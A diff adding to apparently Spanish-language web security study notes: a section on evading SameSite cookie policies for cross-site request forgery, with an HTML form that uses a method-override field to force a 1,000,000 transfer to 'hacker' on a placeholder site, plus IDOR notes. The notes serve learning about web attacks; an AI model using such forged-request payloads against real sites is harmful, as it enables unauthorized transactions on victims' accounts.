@@ -675,6 +675,19 @@ User=1&csrfkey=222
   <input type="hidden" name="csrf" value="I4R9vWYU4GCbDeWhAf1pEuoNx1Ou9jpm">
 </form>
 ```
+6. Evasión de politicas SameSite en cookies:
+  - El procedimiento más sencillo es abusar de cookies con la politica colocada como Lax:
+    - El request es aceptado por GET.
+    - Se usan frameworks de desarrollo que sobre escriban el metodo por ejemplo "Symfony"
+```html
+<form action="https://vulnerable-website.com/account/transfer-payment" method="POST">
+    <input type="hidden" name="_method" value="GET">
+    <input type="hidden" name="recipient" value="hacker">
+    <input type="hidden" name="amount" value="1000000">
+</form>
+```
+  - Tambien se podria abusar de strict, pero es más complicado:
+    - Inyectar un form o liga en un subdominio vulnerable, y redireccionarlo al objetivo.
 
 ## IDOR:
 Mal asignación de permisos para ver recursos que solo deberian pertenecerle a un usuario, ejemplo: /read.php?file=reporte_enero.pdf sí esté URL es accesible para todos los usuarios pero solo deberia poder verlo quien lo subio.
